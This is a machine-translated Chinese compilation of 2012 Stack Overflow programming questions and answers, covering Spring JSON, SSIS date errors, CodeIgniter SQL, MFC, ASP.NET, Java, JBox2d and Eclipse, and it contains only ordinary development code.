它仍在进行中，但对于您的目的非常有用，我想说！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T08:43:28.970

你目前是如何实现你所拥有的？您对“细胞”的提及使您听起来像是在使用`UITableView`. 您将无法在两个方向上滚动其中一个，您需要使用`UIScrollView`.

我建议您观看[WWDC 2010的“使用滚动视图设计应用程序”，然后观看](https://developer.apple.com/videos/wwdc/2010/)[WWDC 2011](https://developer.apple.com/videos/wwdc/2011/)的“高级滚动视图技术” 。这将教你如何实现平铺和无限滚动。

本质上，您要做的是自己实现某种视图回收，就像 UITableView 回收其单元格的方式一样。当事物从滚动视图的一侧滚动时，您将删除刚刚滚动到屏幕外的事物的视图并将它们放入队列中。当事物滚动到屏幕上时，您将视图从队列中拉出（如果队列为空，则创建新视图）并将这些视图放置在正确的位置。

为了进行无限滚动，你假装它：当你的滚动视图接近它的边缘时，你重新定位它里面的所有东西，你将滚动视图的内容偏移量移动到你重新定位视图的位置，然后你从那里继续：这就是全部立即完成，因此用户永远不会注意到。

这些视频将比我在这里总结的更好地解释这些技术：将它们作为您的第一个呼叫点。

# java - 在 Spring 中将数据从客户端发送到服务器

> ID：10514928
> 
> 赞同：0
> 
> 时间：2012-05-09T11:11:44.277
> 
> 标签：java, json, spring, httpwebrequest

我正在使用 Spring MVC、Hiberbate 和 MySQL 数据库开发一个 Web 应用程序。我正在尝试从客户端向服务器发送数据，但我做不到。

具体来说，
我想将我的 JSON 数据发送到**http://localhost:8080/app/test**。在我的*测试控制器*中，我想获取来自客户端的数据并将其写入屏幕或保存到数据库。我已经搜索了大约 3 天，并且尝试了很多策略来做到这一点，但我做不到。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:50:31.253

您必须明确告诉 spring 使用 json 解析器。例如，这是我的 DispatcherServlet 配置的一部分：

```

```
``<bean
    class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter">
    <property name="messageConverters">
        <list>
            <ref bean="jsonConverter" />
        </list>
    </property>
</bean>

<bean id="jsonConverter"
    class="org.springframework.http.converter.json.MappingJacksonHttpMessageConverter">
    <property name="supportedMediaTypes" value="application/json" />
</bean>`` 
```

 [Jackson](http://jackson.codehaus.org/)必须在你的类路径中。

然后你在带注释的控制器中编写一个类似这样的方法：

```

```
``@RequestMapping(value = "/test", method = RequestMethod.POST)
public void myMethod(@RequestBody MyObject object) {
    //... do what you want with the object
}`` 
```

 您只需通过 POST 请求发送一个 JSON 对象，其属性与 MyObject 中的属性相匹配。 
``` 
```

# mysql - SSIS：将表从 MySQL 复制到 SQL Server 2008

> ID：10514932
> 
> 赞同：5
> 
> 时间：2012-05-09T11:11:58.073
> 
> 标签：mysql, sql-server-2008, ssis

尝试将 4 个表从 MySQL 源复制到 SQL Server 2008 时出现错误。

这是数据流的照片，如您所见，其中 2 个都可以（较小的）

![在此处输入图像描述](../Images/9d52ca37c0a4ff8d143012f47b0edc7e.png)

使用`OnError`事件处理程序，我可以看到错误。他们来了。

> SSIS 错误代码 DTS_E_OLEDBERROR。发生 OLE DB 错误。错误代码：0x80040E21。OLE DB 记录可用。来源：“Microsoft SQL Server Native Client 10.0” Hresult：0x80040E21 描述：“多步 OLE DB 操作产生错误。检查每个 OLE DB 状态值（如果可用）。没有完成任何工作。”。
> 
> 输入“OLE DB 目标输入”(510) 上的输入列“FechaHoraCorteAgente”(884) 出现错误。返回的列状态为：“转换失败，因为数据值溢出了指定类型。”。
> 
> SSIS 错误代码 DTS_E_INDUCEDTRANSFORMFAILUREONERROR。“输入“OLE DB 目标输入”(510)”失败，因为发生错误代码 0xC020907A，并且“输入“OLE DB 目标输入”(510)”上的错误行处置指定错误失败。指定组件的指定对象发生错误。在此之前可能会发布错误消息，其中包含有关失败的更多信息。
> 
> SSIS 错误代码 DTS_E_PROCESSINPUTFAILED。处理输入“OLE DB 目标输入”(510) 时，组件“OLE DB 目标 2”(497) 上的 ProcessInput 方法失败，错误代码为 0xC0209029。已识别的组件从 ProcessInput 方法返回错误。该错误是特定于组件的，但该错误是致命的，将导致数据流任务停止运行。在此之前可能会发布错误消息，其中包含有关失败的更多信息。
> 
> 组件“ado net conptacto”(1) 无法处理数据。HRESULT 异常：0xC0047020
> 
> 组件“ADO NET logllamados”(482) 无法处理数据。HRESULT 异常：0xC0047020
> 
> SSIS 错误代码 DTS_E_PRIMEOUTPUTFAILED。组件“ado net conptacto”(1) 上的 PrimeOutput 方法返回错误代码 0xC02090F5。当管道引擎调用 PrimeOutput() 时，组件返回了失败代码。失败代码的含义由组件定义，但错误是致命的并且管道停止执行。在此之前可能会发布错误消息，其中包含有关失败的更多信息。
> 
> SSIS 错误代码 DTS_E_PRIMEOUTPUTFAILED。组件“ADO NET logllamados”(482) 上的 PrimeOutput 方法返回错误代码 0xC02090F5。当管道引擎调用 PrimeOutput() 时，组件返回了失败代码。失败代码的含义由组件定义，但错误是致命的并且管道停止执行。在此之前可能会发布错误消息，其中包含有关失败的更多信息。

知道这里发生了什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T14:46:09.750

“转换失败，因为数据值溢出了指定的类型。” 看起来很明显，你正试图在不适合的地方插入一些东西。我建议您将所有源列与目标列进行比较，并确保：

*   长度就足够了
*   数据类型兼容

如果您愿意，可以发布您的表格结构

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T15:22:42.477

源列在日期时间字段中有 0000-00-00。所以出现了错误。

使用以下表达式创建派生列：

```
(DT_DBTIMESTAMP)(DAY([FechaHoraCorteAgente]) == 0 ? NULL(DT_DBTIMESTAMP) : [FechaHoraCorteAgente]) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-09T15:42:39.900

这是源头的故障，如果包在目的地插入时出现故障，那很容易解决。我遇到过很多情况，其中源数据大于 SSIS 源期望看到的数据。

我认为当您创建源时，SSIS 会自动对输入数据进行采样以查看最大长度。但是，如果超过了最大长度怎么办？这就是我看到与溢出有关的大多数问题的地方。

此外，很多时候在处理处理不当的源数据时，您会在日期时间字段中看到字符数据。这种情况也会破坏包装。

# flash - 在 Flash Builder 的 Actionscript 中编写 ItemRenderer

> ID：10514936
> 
> 赞同：0
> 
> 时间：2012-05-09T11:12:19.750
> 
> 标签：flash, actionscript, itemrenderer

我正在尝试纯粹在动作脚本中编写项目渲染器（在 Flash Builder 4.6 中），因为与内置渲染器相比，动作脚本似乎提供了更快、更可定制的界面。（标签/图标等）。

我希望列表显示一个图像和两个文本字段。目前它将所有这些元素放在画布上，但是一旦我开始滚动（并且虚拟列表生效），我的旧元素就不会从舞台上删除。例如：滚动前 [http://i.stack.imgur.com/Mk5HX.png](http://i.stack.imgur.com/Mk5HX.png) 滚动后 [http://i.stack.imgur.com/Qt7wZ.png](http://i.stack.imgur.com/Qt7wZ.png)

数据存储在名称、图像、公司和职务中。

关于这个问题的任何帮助，或者实际上是一种更好的方法来做我想做的事情，我们将不胜感激。

目前我有一堂课（我已经删除了导入等）

```
public class UILabel2 extends IconItemRenderer
    {
        public function UILabel2() {
            super();
        }
override public function set data(value:Object):void
        {
            super.data = value;
            var DBname:String = data.name as String;
            var DBimage:String = data.image as String;
            var DBcompany:String = data.Company as String;
            var DBtitle:String = data.Title as String;

            //iconField = location;

            trace(DBname);
            label = DBname;
            messageField = "Peanuts";

            //iconWidth=64;
            //iconHeight=64;
            avatarHolder = new Graphic();
            avatar = new BitmapImage();

            iconField = DBimage;

            avatar.fillMode = "clip";
            avatar.source = DBimage;
            avatarHolder.width = 64;
            avatarHolder.height = 64;

            avatarHolder.addElement( avatar );
            addChild(avatarHolder);

            text2 = new TextField();
            text2.x = textMargin;
            text2.y = 45;
            text2.text = DBcompany;
            addChild(text2);

            var text3:TextField = new TextField();
            text3.x = textMargin;
            text3.y = 25;
            text3.text = DBtitle;
            addChild(text3);
            //trace(listArrow1MED);

            arrowHolder = new Graphic();

            //arrowHolder.width = 20;
            //arrowHolder.height = 20;
            arrowHolder.x= Wsize-40;
            //trace(Wsize);

            arrow = new BitmapImage();

            arrow.fillMode = "clip";
            arrow.source = listArrow1LGE;

            arrowHolder.addElement( arrow );
            addChild(arrowHolder);

            //iconField = avatar;
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T12:51:19.020

为了最大限度地减少资源使用，Flash 回收了 ItemRenderers。这意味着每个 ItemRenderer 可以构造一次，然后多次更改其数据。

在您的情况下，这意味着每次设置渲染器的数据时，它都会在渲染器中创建**新的**组件（文本字段、图像）。

你需要做什么来解决这个问题：

1.  将所有创建组件/addElement/addChild 代码移动到构造函数中。
2.  创建变量以存储对这些组件的引用。
3.  在`set data`中，更改这些对象显示的数据，而不是创建新组件。

# php - 在 codeigniter 中有多个连接的 SUM 排序

> ID：10514940
> 
> 赞同：2
> 
> 时间：2012-05-09T11:12:30.430
> 
> 标签：php, mysql, codeigniter

解决方案：

```
$query = $this->db->query("
   SELECT *, SUM(views.times) AS sum
   FROM channel
   RIGHT JOIN video
   ON channel.channel_id = video.channel_id
   LEFT JOIN user
   ON channel.user_id = user.user_id
   LEFT JOIN views
   ON channel.channel_id = views.channel_id
   GROUP BY channel.channel_name
   ORDER BY sum DESC
"); 
```

我有一个返回项目列表的查询。

```
function getfrontpage(){
    $this->db->select('*');
    $this->db->from('channel');     
    $this->db->join('video', 'channel.channel_id = video.channel_id' , 'right');
    $this->db->join('user', 'channel.user_id = user.user_id');
    $this->db->group_by("channel.channel_name"); 
    $query = $this->db->get();
    return $query->result();
} 
```

现在我正在尝试使用另一个表中的 SUM 来订购这些，我该如何实现呢？

这是该表中的一张图片： ![查看表](../Images/3a5815e967c509be4e66e8b685f3e34d.png)

我希望结果按每个“channel_id”的“时间”总和进行排序

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:49:30.063

我建议改为运行这个`$this->db->query()`。

很高兴通过 CodeIgniters AR 函数获取简单的值。但是在某些情况下，构建查询字符串会更容易。

在你的情况下：

```
$query = $this->db->query("
SELECT channel_id, SUM(times) AS sum
FROM channel
GROUP BY channel_id
ORDER BY sum DESC
"); 
```

* * *

您还可以通过 db->query() 转义大多数值！

```
$this->db->query("
SELECT name
FROM table_name
WHERE id = ?
", array(1)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:37:34.590

不是那么简单`$this->db->order_by("channel_id", "desc");`吗？这将按 channel_id 降序排列结果。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T11:50:07.537

假设您的问题中显示的表名为 times_table，并且具有 user_id、channel_id 的键，您可以使用以下代码将 times_table 加入您的查询中，以便“times”列可供排序依据。

```
$this->db->join("times_table", "times.user_id=channel.user_id, times.channel_id=channel.channel_id", "left");
// You've already grouped by channel_name, so grouping by channel_id is probably not necessary.
$this->db->order_by("SUM(times_table.times) DESC"); 
```

注意我只是猜到您显示的表格的名称是times_table。

# view - MFC 应用程序仅更新当前视图

> ID：10514942
> 
> 赞同：0
> 
> 时间：2012-05-09T11:12:53.433
> 
> 标签：view, mfc, split

我使用静态拆分将我的 VC++6 MFC 应用程序的主视图与 (1x2) 或 (3x3) 等行和列分开。

单击这些部分之一是 Active View。

当我在 Active View 上绘制一个形状时，比如说一个圆形/矩形，所有其他视图都模仿我在 Active View 上绘制的形状。我该如何避免呢？

我尝试使用 Active View 作为第一个参数的 UpdateAllViews()。它仍然做同样的事情。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T14:34:52.733

UpdateAllViews() 为每个视图调用 OnUpdate() 函数。OnUpdate() 的默认实现使客户区无效（谈论简单的“图形”视图，如 CView() 或 CScrollView()）。您可以覆盖 OnUpdate() 成员并在 lHint 和/或 pHint 参数中编码所需的行为（就失效/更新而言）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-10T03:13:24.493

如果您对所有视图使用相同的类，这是预期的行为，因为拆分器将所有视图连接到同一个文档对象。我假设您正在使用文档对象来存储绘图数据。

UpdateAllViews 用于在文档中的数据发生变化时更新视图。然后，每个视图使用文档的数据来呈现该数据的不同视觉解释。因此，每个视图将是不同的类型（由不同的类表示），知道如何可视化数据。

**例如：** document 用于存储数字数组。三个视图将这些数字显示为十进制、十六进制和二进制表示。如果更改了一个数字，则通知所有视图更新自己的表示。

在您的情况下，工作解决方案是将绘图数据移动到视图而不是文档。您的应用程序很可能根本不需要文档。

# asp.net - 在运行时创建的连线按钮

> ID：10514944
> 
> 赞同：0
> 
> 时间：2012-05-09T11:13:00.973
> 
> 标签：asp.net

我根据一些运行时变量的值创建了一些按钮（我什至不知道有多少）。

我的按钮代码如下：

```
Button cancel = new Button();
            cancel.Text = "Cancel";
            cancel.ID = "cancelEnrollmentForStudent" + zapsanePredmetyList.ElementAt(i).ID.ToString() + "-" + i ;
            cancel.Click += new EventHandler(cancelEnrollment);
            string toCancel = selectedSubject.SelectedValue + ";" + studentToEnroll.SelectedValue;
            cancel.CommandArgument = toCancel; 
```

而 click 方法的代码是

```
protected void cancelEnrollment(object sender, EventArgs e)
    {
        //do something when button clicked. 
        Button sourceButton = (Button)sender;
        string[] data = sourceButton.CommandArgument.Split(';');
    } 
```

但是，单击按钮时，单击方法不会启动。我想这与我在运行时构建按钮的事实有关。Cld有人建议如何让这种方法启动？

谢谢， Ondrej

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:39:21.737

您必须重写 OnInit 在 OnInit 方法中添加代码。

```
protected override void OnInit(EventArgs e) 
{
    base.OnInit(e);
    Button btn = new Button();
    btn.ID = "btn1";
    btn.Text = "Button1";   
    btn.Click += new EventHandler(btn_Click);
    this.form1.Controls.Add(btn);
}

void btn_Click(object sender, EventArgs e)
{     
    Button bt = (Button)sender;
    bt.Text = "Changed";        
} 
```

# java - 为 java 文本编辑器添加粗体和下划线功能

> ID：10514956
> 
> 赞同：0
> 
> 时间：2012-05-09T11:13:38.067
> 
> 标签：java

我正在开发一个文本编辑器，我有主框架，通常它工作正常，添加额外的单词删除，但我希望为其添加粗体和下划线功能。我不知道该怎么做。是否有可能，如果有任何建议，代码如下：

```
import java.util.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.geom.*;
import java.awt.image.*;

class Main
{
    public static void main( String args[] ) //  
    {                                        //  
        System.out.println("Application");
        (new Application()).setVisible(true);  // Start application  
    }                                        //  
}

/*
 * Copy of file in a buffer in memory
 *  Which is a collection of lines
 */

class Buffer
{
    private ArrayList<Line> file = new ArrayList<Line>(0);
    private int lines = 0;

    public int getNoLines() 
    { 
        return file.size(); 
    }

    public String getLine( int i )
    {
        if ( i < lines )
        {
            return file.get(i).toString();
        }
        return "Error";
    }

    public void append( String s )
    {
        file.add( new Line( s ) );
        lines++;
    }

    public void insert( int offset, int line, char c )
    {
        if ( line <= lines )
        {
            file.get(line).insert( offset, c );
        }
    }

    public void delete( int offset, int line )
    {
        if ( line <= lines )
        {
            file.get(line).delete( offset );
        }
    }

    public int getLineLength( int line )
    {
        return file.get( line ).getLineLength();
    }

}

/*
 * A line of text in the buffer
 */

class Line
{
    private StringBuffer aLine;

    public Line( String s )
    {
        aLine = new StringBuffer(256);
        aLine.append( s );
    }

    public String toString()
    {
        return aLine.toString();
    }

    public void setLine( String s )
    {
        aLine = new StringBuffer(256);
        aLine.append(s);
    }

    public void insert( int pos, char c )
    {
        if ( pos <= aLine.length() )
        {
            aLine.insert( pos, c );
        }
    }

    public void delete( int pos )
    {
        if ( pos <= aLine.length() )
        {
            aLine.delete( pos, pos+1 );
        }
    }

    public int getLineLength()
    {
        return aLine.length();
    }

}

class Application extends JFrame            // So graphical  
{
    private static final int H = 300;         // Height of window  
    private static final int W = 400;         // Width  of window  
    private int x = 0;
    private int y = 0;

    Buffer file = new Buffer();

    public Application()
    {
        // Fake reading in file 
        file.append( "Line 1" );
        file.append( "Line 2" );
        file.append( "----------" );
        file.append( "Line 3" );
        file.append( "Line 4" );
        file.append( "----------" );
        file.append( "Line 5" );
        file.append( "Line 6" );

        setSize( W, H );                        // Size of application  
        addKeyListener( new Transaction() );    // Called when key press  
        setDefaultCloseOperation(EXIT_ON_CLOSE);
     }

    class Transaction implements KeyListener  // When character typed  
    {
        public void keyPressed(KeyEvent e)      // Obey this method  
        {
            int ll = 0;
            switch ( e.getKeyCode() )              // Character is  
            {
                case KeyEvent.VK_LEFT:               // Left Arrow  
                if ( x > 0 ) x--;
                break;

                case KeyEvent.VK_RIGHT:              // Right arrow  
                ll = file.getLineLength( y );
                if ( x  < ll ) x++;
                break;

                case KeyEvent.VK_UP:                 // Up arrow  
                if ( y > 0 ) y--;
                ll = file.getLineLength( y );
                if ( x > ll ) x = ll;
                break;

                case KeyEvent.VK_DOWN:               // Down arrow  
                int fl = file.getNoLines();
                if ( y < fl-1 ) y++;
                ll = file.getLineLength( y );
                if ( x > ll ) x = ll;
                break;
            }
            repaint();                            // Call update method  
        }

        public void keyReleased(KeyEvent e)
        {
            // Called on key release including specials  
        }

        public void keyTyped(KeyEvent e)
        {
            char c = e.getKeyChar();              // Append printing char 
            if ( c >= ' ' && c <= '~' )
            {
                file.insert( x, y, c );
                x++;
            }
            if ( c == (char) 127 )                // Delete char from file 
            {
                if ( x > 0 ) 
                {
                    file.delete( x-1, y );
                    x--;
                }
            }
            repaint();                            // Redraw screen  
        }
    }

    public void update( Graphics g )          // Called by repaint  
    {                                         //  
        drawPicture( (Graphics2D) g );          // Draw Picture  
    }

    public void paint( Graphics g )           // When 'Window' is first  
    {                                         //  shown or damaged  
        drawPicture( (Graphics2D) g );          // Draw Picture  
    }

    private Dimension     theAD;              // Alternate Dimension 
    private BufferedImage theAI;              // Alternate Image 
    private Graphics2D    theAG;              // Alternate Graphics 

    public void drawPicture( Graphics2D g )   // Double buffer 
    {                                         //  allow re-size 
        Dimension d    = getSize();             // Size of image 

        if (  ( theAG == null )  ||
        ( d.width  != theAD.width ) ||
        ( d.height != theAD.height ) )
        {                                       // New size 
            theAD = d;
            theAI = (BufferedImage) createImage( d.width, d.height );
            theAG = theAI.createGraphics();
            if (true )
            {
                AffineTransform at = new AffineTransform();
                at.setToIdentity();
                at.scale( ((double)d.width)/W, ((double)d.height)/H );

                theAG.transform(at);
            }
        }

        drawActualPicture( theAG );             // Draw Picture 
        g.drawImage( theAI, 0, 0, this );       //  Display on screen 
    }

    public void drawActualPicture( Graphics2D g ) // Draw text 
    {
        int WA= 20;      // Offset Width 
        int HA= 40;      // Offset Height for drawing text 

        Font font = new Font("Monospaced",Font.PLAIN,14);
        g.setFont( font );

        FontMetrics fm = g.getFontMetrics();
        int WF         = fm.charWidth( '.' );  // Width  pixels 
        int HF         = fm.getHeight();       // Height pixels 

        // Clear drawing area 
        g.setPaint( Color.white );              // Paint Colour  
        g.fill( new Rectangle2D.Double( 0, 0, W, H ) );

        // Display text of file in black 
        g.setPaint( Color.black );
        for ( int i=0; i<file.getNoLines(); i++ )
        {
            g.drawString( file.getLine(i), WA, i*HF + HA );
        }

        // Draw cursor current position 
        g.setPaint( Color.red );
        g.drawLine( WA + x*WF, HA + y*HF, WA + (x)*WF, HA + (y-1)*HF );

    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T11:22:09.817

如果您想要粗体文本，请使用

```
Font theFont = new Font("Serif", Font.BOLD, 12); 
```

如果你想强调它：

```
Map<TextAttribute, Integer> fontAttributes = new HashMap<TextAttribute, Integer>();
fontAttributes.put(TextAttribute.UNDERLINE, TextAttribute.UNDERLINE_ON);
Font boldUnderline = new Font("Serif",Font.BOLD, 12).deriveFont(fontAttributes); 
```

[Java中下划线字体的常量值是多少？](https://stackoverflow.com/questions/325840/what-is-the-constant-value-of-the-underline-font-in-java)

# android - 华硕变压器（和其他）的 HDMI API

> ID：10514967
> 
> 赞同：3
> 
> 时间：2012-05-09T11:14:22.283
> 
> 标签：android, api, multiple-monitors, hdmi

目前 HDMI 输出由专有 API 处理。[摩托罗拉](http://developer.motorola.com/docs/motorola-hdmi-dual-screen-api/)是最容易找到的，但其他制造商的类似 API 在哪里？我对 Transformer Prime 最感兴趣，但三星和 LG 也有 HDMI 输出。

# objective-c - 如何在 iOS 中读取 wav 文件数据帧

> ID：10514975
> 
> 赞同：3
> 
> 时间：2012-05-09T11:14:56.090
> 
> 标签：objective-c, ipad, wav

我正在开发一个 iPad (IOS 5) 项目，我需要读取 WAV PCM 文件的原始数据帧。理想的解决方案是在读取帧时进行回调。

我有以下问题：

1.  有我可以使用的 C 库吗？

2.  是否已经存在专门的目标 C 类（如 AVAudioPlayer）？

# ruby-on-rails - Rails - 基本模型约定和基本关联混淆

> ID：10514976
> 
> 赞同：1
> 
> 时间：2012-05-09T11:14:56.683
> 
> 标签：ruby-on-rails

我对我目前正在处理的约定的理解如下：

模型名称应该在 TitleCaps 中。

变量名应该是 lower_cased_and_under_scored。

关联应该是外部表名称的单数版本，并附加 _id，例如 user_uploaded_picture_id

*   在执行“rails generate model ModelName”时 - 它应该在 TitleCaps 中吗？
*   我需要的每个数据库表都应该指定每个关联吗？在这个注释上，是否需要指定两种方式的关联，即每个 has_one/has_many 是否应该与一个 belongs_to 匹配？
*   我打算创建的每个数据库表都应该有一个模型吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:21:10.357

多个问题合二为一:)

1.  两者`model_name`和`ModelName`都被接受并生成正确的模型和表名。
2.  您不需要只指定您想要使用的那些关联。
3.  不，您不需要为每个表创建模型。但是，如果您使用 Rails 中的那个表，那么使用它会更容易。

# java - JBox2d - world.getBodyList() 进入无限循环

> ID：10514981
> 
> 赞同：3
> 
> 时间：2012-05-09T11:15:09.320
> 
> 标签：java, android, box2d, jbox2d

我正在尝试创建一个类，将我的 JBox2d 世界的对象绘制到画布上。

更新时我打电话给

```
render.draw(canvas,world); 
```

它将世界和画布传递给绘图类，它应该循环遍历世界对象并将它们绘制到画布中。

```
public void draw(Canvas canvas, World world)
{

    canvas.drawColor(0xFF6699FF);

    for ( Body b = world.getBodyList(); b!=null; b.getNext() )
    {
        Log.e("xy", String.valueOf( b.getPosition().x )+" "+String.valueOf( b.getPosition().y )  );
    }

} 
```

但它似乎进入了一个无限循环，后退按钮不起作用，然后它说“没有响应”并提供强制关闭。

任何想法在这种情况下循环通过身体的正确方法是什么？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-09T22:54:13.037

正如我的评论中提到的 - 循环应该如下：

```
for ( Body b = world.getBodyList(); b!=null; b = b.getNext() )
{
    Log.e("xy", String.valueOf(b.getPosition().x)+ " " + String.valueOf(b.getPosition().y));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-07T10:16:38.160

这是一种方法。您可以通过世界实体列表访问您的不同形状（多边形/圆形）：

```
public void draw(Canvas canvas){
    Body body = world.getBodyList();
    while(body != null){
        Fixture fixture = body.getFixtureList();
        while(fixture != null){
            ShapeType type = fixture.getType();
            if(type == ShapeType.POLYGON){
                PolygonShape shape = (PolygonShape)fixture.getShape();
                // draw shape
            }else if(type == ShapeType.CIRCLE){
                CircleShape shape = (CircleShape)fixture.getShape();
                // draw shape
            }
            fixture = fixture.getNext();
        }
        body = body.getNext();
    }       
} 
```

# asp.net - ASP.NET - 在转发器 DataBound 上保留 DropDownList 选择

> ID：10514982
> 
> 赞同：0
> 
> 时间：2012-05-09T11:15:10.910
> 
> 标签：asp.net, data-binding, drop-down-menu, postback, repeater

我`DropDownLists`每个项目有两个`Repeater`。

我将两个列表绑定到转发器上的两个不同列表`DataBound`。

两个列表都有一个`OnSelectedIndexChanged`事件处理程序，它根据两者中的选择进行一些计算`DropDownLists`。两个列表也都有`AutoPostBack="True"`.

我需要立即更新计算。所以我为转发器添加了另一个数据绑定 - 在列表的事件处理程序上。

然而，这就是问题所在 - 中继器将选择“重置”为 -1，最终`DropDownLists`显示两者中的第一个项目。

如何确保在数据绑定后保留选择？

这是中继器结构：

```
 <asp:Repeater runat="server" ID="rptCart">
                <ItemTemplate>
                    <tr>
                        <td class="size"><div><asp:DropDownList runat="server" ID="_selectSize" AutoPostBack="true" OnSelectedIndexChanged="selectChange" EnableViewState="true" TabIndex="<%#Container.ItemIndex%>"></asp:DropDownList></div></td>
                        <td class="material"><div><asp:DropDownList runat="server" ID="_selectMaterial" AutoPostBack="true" OnSelectedIndexChanged="selectChange" EnableViewState="true" TabIndex="<%#Container.ItemIndex%>"></asp:DropDownList></div></td>
                    </tr>
                </ItemTemplate>
            </asp:Repeater> 
```

和中继器`DataBound`：

```
Protected Sub rptCart_ItemDataBound(sender As Object, e As System.Web.UI.WebControls.RepeaterItemEventArgs) Handles rptCart.ItemDataBound
    If e.Item.ItemType = ListItemType.AlternatingItem OrElse e.Item.ItemType = ListItemType.Item Then
        Dim sizeSelect As DropDownList = CType(e.Item.FindControl("_selectSize"), DropDownList)
        Dim materialSelect As DropDownList = CType(e.Item.FindControl("_selectMaterial"), DropDownList)

        sizeSelect.DataSource = sizeList
        sizeSelect.DataBind()
        materialSelect.DataSource = materialList
        materialSelect.DataBind()
    End If
End Sub 
```

最后是`DropDownLists`事件处理程序：

```
Protected Sub selectChange(ByVal sender As DropDownList, ByVal e As System.EventArgs)
    Dim listing As New PriceListing
    Dim ddl As DropDownList
    Dim selectedIndex As Integer

    If sender.ID = "_selectSize" Then
        For Each rptrItem As RepeaterItem In rptCart.Items
            ddl = CType(rptrItem.FindControl("_selectMaterial"), DropDownList)
            If ddl.TabIndex = sender.TabIndex Then Exit For
        Next

        For Each listing In artDecoPricing
            If listing.Size = sender.SelectedValue Then Exit For
        Next

        selectedIndex = ddl.SelectedIndex
    ElseIf sender.ID = "_selectMaterial" Then
        For Each rptrItem As RepeaterItem In rptCart.Items
            ddl = CType(rptrItem.FindControl("_selectSize"), DropDownList)
            If ddl.TabIndex = sender.TabIndex Then Exit For
        Next

        For Each listing In artDecoPricing
            If listing.Size = ddl.SelectedValue Then Exit For
        Next

        selectedIndex = sender.SelectedIndex
    End If

    Select Case selectedIndex
        Case 0
            Cart.Order.Items(sender.TabIndex).PriceUnit = listing.Canvas
        Case 1
            Cart.Order.Items(sender.TabIndex).PriceUnit = listing.Acrylic
        Case 2
            Cart.Order.Items(sender.TabIndex).PriceUnit = listing.Framed
        Case 3
            Cart.Order.Items(sender.TabIndex).PriceUnit = listing.Framed
    End Select

    Cart.SaveOrder()

    rptCart.DataSource = Cart.Order.Items
    rptCart.DataBind()
End Sub 
```

非常感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:33:40.800

您可以存储旧的选择：

```
Dim sizeSelect As DropDownList = CType(e.Item.FindControl("_selectSize"), DropDownList)
Dim materialSelect As DropDownList = CType(e.Item.FindControl("_selectMaterial"), DropDownList)
Dim sizeSelectedIndex = sizeSelect.SelectedIndex
Dim materialSelectedIndex = materialSelect.SelectedIndex
' do the databinding ... '
sizeSelect.SelectedIndex = If(sizeSelectedIndex < sizeSelect.Items.Count -1, sizeSelectedIndex, -1)
materialSelect.SelectedIndex = If(materialSelectedIndex < materialSelect.Items.Count -1, materialSelectedIndex, -1) 
```

# c# - 使用 WP7 下载文件

> ID：10514984
> 
> 赞同：1
> 
> 时间：2012-05-09T11:15:14.827
> 
> 标签：c#, windows-phone-7

如何使用 WP7 下载文件。不允许使用 Webclients DownloadFile。

我应该把它们保存在哪里，它们只是暂时的原因（xml文件）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:19:27.987

试试这个：

```
 System.Uri targetUri = new System.Uri("http://www.dot.com/yourFile.zip");
    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(targetUri);
    request.BeginGetResponse(new AsyncCallback(ReadWebRequestCallback), request); 
```

# android - 如何通过服务器将文本从一个android客户端发送到另一个？

> ID：10514991
> 
> 赞同：0
> 
> 时间：2012-05-09T11:15:44.150
> 
> 标签：android, .net, sockets

情况：

假设我有 2 个模拟器，我想将文本从一个模拟器发送到另一个模拟器。解决这个问题的方法是什么？我可以使用 .Net 网络服务吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:20:10.323

任何可以从 Android 客户端转发您的消息的东西。因此，如果您不想让它变得复杂，请考虑使用某种 RESTful WS。祝你好运

对于 .NET 平台，也许您想快速浏览一下此链接 [链接到一些博客](http://blogs.msdn.com/b/kaevans/archive/2008/04/03/creating-restful-services-using-wcf.aspx)

# eclipse - 如何为多个平台导出 Eclipse 功能？

> ID：10514993
> 
> 赞同：1
> 
> 时间：2012-05-09T11:15:46.567
> 
> 标签：eclipse, eclipse-plugin, osgi, eclipse-pde

我有一个带有一些平台相关片段的 Eclipse 功能（准确地说，是基于 jogamp 的插件）

我想使用 PDE 导出来导出该功能。它像往常一样工作，只是它会省略所有与我当前平台不匹配的插件。

我想将此导出的功能用作可以从不同平台使用的 p2 站点，所以这不好。

有没有办法为所有平台导出 Eclipse 功能？

谢谢，弗兰克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T13:30:41.650

没有简单的方法可以从 Eclipse 中获取所有平台作为 PDE 导出。我尝试使用 PDE 构建作为工作区导出，[http](http://pweclipse.blogspot.com/2011/02/pde-build-as-workspace-export.html) ://pweclipse.blogspot.com/2011/02/pde-build-as-workspace-export.html但它需要一些挖掘才能使所有属性正确并且它特定于一个工作区。

最好设置一个适当的无头 PDE 构建来生成您的 p2 站点。